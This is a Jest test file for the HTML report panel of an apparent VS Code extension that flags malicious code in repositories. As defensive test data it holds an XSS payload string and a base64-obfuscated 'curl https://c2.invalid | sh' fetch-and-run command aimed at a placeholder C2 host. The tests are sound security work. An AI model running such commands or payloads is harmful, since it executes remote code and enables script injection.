import { scoreEvidence } from '../src/engine';
import { escapeHtml, evidenceCountTitle, groupByFile, parsePanelMessage, renderPanelHtml } from '../src/panelHtml';
import { Evidence, Family } from '../src/types';

function ev(familia: Family, arquivo: string, linha: number, extra: Partial<Evidence> = {}): Evidence {
  return {
    id: `regra-${familia}@${arquivo}:${linha}:1`,
    familia,
    arquivo,
    linha,
    coluna: 1,
    trecho: 'const x = 1;',
    explicacao: 'Explicação simples.',
    ...extra,
  };
}

const NONCE = 'nonceDeTeste123';

function render(evidencias: Evidence[], pasta = 'desafio-tecnico'): string {
  return renderPanelHtml({ pasta, resultado: scoreEvidence(evidencias) }, { nonce: NONCE });
}

describe('título e agrupamento', () => {
  it('usa singular e plural', () => {
    expect(evidenceCountTitle(1)).toBe('1 evidência encontrada');
    expect(evidenceCountTitle(3)).toBe('3 evidências encontradas');
    expect(render([ev('EXEC_SISTEMA', 'a.js', 1), ev('SAIDA_REDE', 'b.js', 2)])).toContain('<h1>2 evidências encontradas</h1>');
  });

  it('agrupa por arquivo: fora da contenção primeiro, depois a correlação', () => {
    const r = scoreEvidence([
      ev('EXEC_SISTEMA', 'a.js', 1),
      ev('ACESSO_SENSIVEL', 'scripts/setup.js', 3),
      ev('SAIDA_REDE', 'scripts/setup.js', 7),
      ev('EXEC_AUTOMATICA', '.vscode/tasks.json', 10, { foraDaContencao: true }),
    ]);
    const groups = groupByFile(r);
    expect(groups.map((g) => g.arquivo)).toEqual(['.vscode/tasks.json', 'scripts/setup.js', 'a.js']);
    expect(groups[1].correlacao).toBe(true);
    expect(groups[1].evidencias.map((e) => e.linha)).toEqual([3, 7]);
  });
});

describe('segurança do HTML', () => {
  const hostile = '<script>alert(1)</script><img src=x onerror="alert(2)">\'`';

  it('escapa todo conteúdo do repositório', () => {
    const html = render(
      [
        ev('EXEC_SISTEMA', `src/${hostile}.js`, 1, {
          id: `x@${hostile}`,
          trecho: hostile,
          explicacao: `Executa ${hostile}`,
          decodificado: hostile,
        }),
      ],
      hostile,
    );
    expect(html).not.toContain('<img');
    expect(html).not.toContain('onerror="');
    // O único <script> é o nosso, com nonce.
    expect(html.match(/<script/g)).toHaveLength(1);
    expect(html).toContain(`<script nonce="${NONCE}">`);
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  it('declara CSP restritiva com nonce e sem fontes externas', () => {
    const html = render([ev('EXEC_SISTEMA', 'a.js', 1)]);
    expect(html).toContain(`default-src 'none'; style-src 'nonce-${NONCE}'; script-src 'nonce-${NONCE}';`);
    expect(html).not.toMatch(/https?:\/\//);
    expect(html).not.toMatch(/\sstyle="/);
  });

  it('mostra caracteres bidirecionais como marcadores visíveis no conteúdo decodificado', () => {
    const bidi = String.fromCharCode(0x202e);
    const html = render([ev('OFUSCACAO', 'o.js', 1, { decodificado: `admin${bidi}txt` })]);
    expect(html).toContain('admin⟨U+202E⟩txt');
    expect(html).not.toContain(bidi);
  });

  it('escapeHtml cobre aspas, crase e &', () => {
    expect(escapeHtml(`&<>"'\``)).toBe('&amp;&lt;&gt;&quot;&#39;&#96;');
  });

  it('valida mensagens do webview', () => {
    expect(parsePanelMessage({ type: 'inspecionar', id: 'a@b:1:1' })).toEqual({ type: 'inspecionar', id: 'a@b:1:1' });
    expect(parsePanelMessage({ type: 'sandbox', extra: 'x' })).toEqual({ type: 'sandbox' });
    expect(parsePanelMessage({ type: 'inspecionar' })).toBeUndefined();
    expect(parsePanelMessage({ type: 'executarNoHospedeiro' })).toBeUndefined();
    expect(parsePanelMessage('cancelar')).toBeUndefined();
    expect(parsePanelMessage(null)).toBeUndefined();
  });
});

describe('conteúdo', () => {
  it('mostra original e decodificado lado a lado', () => {
    const html = render([
      ev('OFUSCACAO', 'o.js', 4, {
        trecho: "Buffer.from('Y3VybCBodHRwczovL2MyLmludmFsaWQgfCBzaA==', 'base64')",
        decodificado: 'curl https://c2.invalid | sh',
      }),
    ]);
    expect(html).toContain('class="lado-a-lado"');
    expect(html).toContain('Original');
    expect(html).toContain('curl https://c2.invalid | sh');
    expect(html).toContain('apenas texto, nada foi executado');
  });

  it('traz as três ações e o botão Inspecionar aponta para a evidência mais relevante', () => {
    const html = render([
      ev('EXEC_SISTEMA', 'z.js', 1),
      ev('EXEC_AUTOMATICA', '.vscode/tasks.json', 9, { foraDaContencao: true }),
    ]);
    expect(html).toContain('data-action="inspecionar" data-id="regra-EXEC_AUTOMATICA@.vscode/tasks.json:9:1">Inspecionar código');
    expect(html).toContain('data-action="sandbox">Executar em sandbox');
    expect(html).toContain('data-action="cancelar">Cancelar');
    expect(html).toContain('Não clique em "Confiar"');
  });

  it('o conteúdo varia conforme o repositório (alerta polimórfico)', () => {
    const a = render([ev('ACESSO_SENSIVEL', 'steal.js', 2), ev('SAIDA_REDE', 'steal.js', 5)], 'repo-a');
    const b = render([ev('EXEC_AUTOMATICA', '.vscode/tasks.json', 3, { foraDaContencao: true })], 'repo-b');
    const body = (html: string): string => html.replace(/<style[\s\S]*?<\/style>|<script[\s\S]*?<\/script>/g, '');
    expect(body(a)).not.toEqual(body(b));
    expect(a).toContain('nivel-MEDIO');
    expect(a).toContain('acesso a credenciais ou segredos');
    expect(a).toContain('combinação suspeita neste arquivo');
    expect(b).toContain('roda fora do container');
    expect(b).not.toContain('combinação suspeita');
  });

  it('avisa quando o sandbox não está disponível, com o motivo escapado', () => {
    const resultado = scoreEvidence([ev('EXEC_SISTEMA', 'a.js', 1)]);
    const off = renderPanelHtml(
      { pasta: 'x', resultado, sandbox: { disponivel: false, motivo: 'O Docker não está instalado <b>.' } },
      { nonce: NONCE },
    );
    expect(off).toContain('O sandbox não está disponível nesta máquina.');
    expect(off).toContain('O Docker não está instalado &lt;b&gt;.');
    const on = renderPanelHtml({ pasta: 'x', resultado, sandbox: { disponivel: true } }, { nonce: NONCE });
    const unknown = renderPanelHtml({ pasta: 'x', resultado }, { nonce: NONCE });
    expect(on).not.toContain('class="aviso-sandbox"');
    expect(unknown).not.toContain('class="aviso-sandbox"');
  });

  it('usa apenas variáveis de tema do VS Code para cores', () => {
    const html = render([ev('EXEC_SISTEMA', 'a.js', 1)]);
    const style = /<style[^>]*>([\s\S]*?)<\/style>/.exec(html)?.[1] ?? '';
    expect(style).not.toMatch(/#[0-9a-fA-F]{3,8}\b|rgb\(|hsl\(/);
    expect(style).toContain('var(--vscode-');
  });
});
